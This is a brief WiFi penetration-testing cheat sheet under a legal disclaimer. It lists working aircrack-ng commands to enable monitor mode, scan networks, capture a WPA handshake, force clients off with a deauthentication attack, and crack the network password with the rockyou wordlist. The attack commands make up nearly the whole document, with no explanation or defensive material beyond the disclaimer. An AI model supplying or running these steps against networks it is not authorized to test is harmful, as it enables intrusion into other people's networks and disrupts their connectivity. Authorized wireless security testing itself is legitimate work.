# WiFi Security Testing - Educational Purpose

**LEGAL DISCLAIMER:**
- Use ONLY on networks you own or have explicit written permission to test
- Unauthorized network access is illegal in most countries
- This material is for educational and authorized penetration testing only
- Author is not responsible for misuse

**For authorized security professionals and educational purposes only**

# WiFi Pentest Notes

## turn on monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0

## turn off monitor mode
sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager && sudo systemctl start wpa_supplicant

### check if works
iwconfig 

# handshake
NET-INTERFACE - example wlan0mon
DEAUTH-NO     - example 10
TARGET-BSSID  - example AA:BB:CC:DD:EE:FF
CHANNEL-NO    - example 6
CLIENT-MAC    - example BB:CC:DD:EE:FF:AA

## scan networks
sudo airodump-ng NET-INTERFACE

## capture handshake
sudo airodump-ng --bssid TARGET-BSSID -c CHANNEL-NO -w handshake NET-INTERFACE

## deauth attack (new terminal)
sudo aireplay-ng --deauth DEAUTH-NO -a TARGET-BSSID -c CLIENT-MAC NET-INTERFACE

## verify handshake
aircrack-ng handshake-01.cap

## crack password
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b TARGET-BSSID handshake-01.cap

# troubleshooting
sudo rfkill unblock wifi
sudo modprobe -r rtl8xxxu && sudo modprobe rtl8xxxu